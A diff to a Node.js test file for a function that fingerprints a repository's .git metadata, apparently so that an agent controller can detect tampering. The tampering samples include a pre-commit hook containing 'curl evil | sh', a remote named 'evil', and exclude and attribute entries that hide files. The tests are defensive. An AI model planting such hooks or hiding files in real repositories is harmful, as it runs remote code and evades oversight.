@@ -1,5 +1,6 @@
 const test = require('node:test');
 const assert = require('node:assert');
+const { execFileSync } = require('child_process');
 const fs = require('fs');
 const os = require('os');
 const path = require('path');
@@ -122,22 +123,48 @@ test('tool config files outside Affects are violations, ordinary sources are not
   assert.deepStrictEqual(toolingCheck(statusOf('apps/api/tsconfig.json'), '- apps/api/tsconfig.json', {}, {}), []);
 });
 
-test('gitMetaFingerprint changes when .git/config or a hook changes, and only then', () => {
+const git = (dir, ...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });
+
+const withRepo = (fn) => {
   const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ralph-boundary-'));
   try {
-    fs.mkdirSync(path.join(dir, '.git', 'hooks'), { recursive: true });
-    fs.writeFileSync(path.join(dir, '.git', 'config'), '[core]\n');
-    fs.writeFileSync(path.join(dir, '.git', 'hooks', 'pre-commit.sample'), '#!/bin/sh\n');
-    const base = gitMetaFingerprint(dir);
-    fs.writeFileSync(path.join(dir, '.git', 'HEAD'), 'ref: refs/heads/x\n');
-    assert.strictEqual(gitMetaFingerprint(dir), base);
-    fs.writeFileSync(path.join(dir, '.git', 'hooks', 'pre-commit'), 'curl evil | sh\n');
-    const withHook = gitMetaFingerprint(dir);
-    assert.notStrictEqual(withHook, base);
-    fs.appendFileSync(path.join(dir, '.git', 'config'), '[remote "origin"]\n\tpushurl = x\n');
-    assert.notStrictEqual(gitMetaFingerprint(dir), withHook);
+    git(dir, 'init', '-q');
+    fs.writeFileSync(path.join(dir, 'a.txt'), 'a\n');
+    git(dir, 'add', '-A');
+    git(dir, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-qm', 'init');
+    return fn(dir);
   } finally {
     fs.rmSync(dir, { recursive: true, force: true });
+  }
+};
+
+test('gitMetaFingerprint is stable across the read-only git commands the controller and agent run', () => {
+  withRepo((dir) => {
+    const base = gitMetaFingerprint(dir);
+    fs.writeFileSync(path.join(dir, 'a.txt'), 'changed\n');
+    git(dir, 'status', '--porcelain', '-z', '-uall');
+    git(dir, 'diff', 'HEAD');
+    git(dir, 'show', 'HEAD:a.txt');
+    git(dir, 'log', '--oneline');
+    assert.strictEqual(gitMetaFingerprint(dir), base);
+  });
+});
+
+test('gitMetaFingerprint catches any change inside .git that affects behaviour', () => {
+  const mutations = {
+    'hook added': (dir) => fs.writeFileSync(path.join(dir, '.git', 'hooks', 'pre-commit'), 'curl evil | sh\n'),
+    'config changed': (dir) => git(dir, 'remote', 'add', 'evil', 'https://example.invalid/x.git'),
+    'info/exclude hides files': (dir) => fs.appendFileSync(path.join(dir, '.git', 'info', 'exclude'), 'scripts/\n'),
+    'info/attributes added': (dir) => fs.writeFileSync(path.join(dir, '.git', 'info', 'attributes'), '* filter=x\n'),
+    'ref moved': (dir) => git(dir, 'branch', 'other'),
+    'HEAD switched': (dir) => fs.writeFileSync(path.join(dir, '.git', 'HEAD'), 'ref: refs/heads/other\n'),
+  };
+  for (const [name, mutate] of Object.entries(mutations)) {
+    withRepo((dir) => {
+      const base = gitMetaFingerprint(dir);
+      mutate(dir);
+      assert.notStrictEqual(gitMetaFingerprint(dir), base, name);
+    });
   }
 });
 
